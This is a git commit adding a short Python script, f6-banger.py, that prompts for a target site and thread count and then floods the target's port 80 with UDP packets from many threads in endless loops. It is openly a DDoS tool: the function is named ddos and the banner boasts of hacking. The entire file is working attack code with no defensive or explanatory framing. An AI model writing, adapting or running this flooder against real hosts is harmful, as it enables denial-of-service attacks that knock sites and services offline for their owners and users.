87d40ea29f71135b3dd4f09968a9a4029ba69a61
ahoorabm <87478449+akjwi@users.noreply.github.com>
2023-04-10 03:54:35 +0330

    f6-banger.py

---
+++ f6-banger.py
@@ -0,0 +1,26 @@
+import time
+import socket
+import sys
+import _thread
+print("ahoorabm god hacker")
+print("in scripet vaqei hast pas fakesh nakonid thanks")
+site = input("Enter your site IP => ")
+thread_count = input("Enter your Turbo => ")
+ip = socket.gethostbyname(site)
+UDP_PORT = 80
+MESSAGE = 'ahoorabm'
+print("UDP target IP:", ip)
+print("UDP target port:", UDP_PORT)
+time.sleep(3)
+def ddos(i):
+    while 1:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
+        print("Packet Sent / f6-banger ahoorabm")
+for i in range(int(thread_count)):
+    try:
+        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
+    except KeyboardInterrupt:
+        sys.exit(0)
+while 1:
+    pass
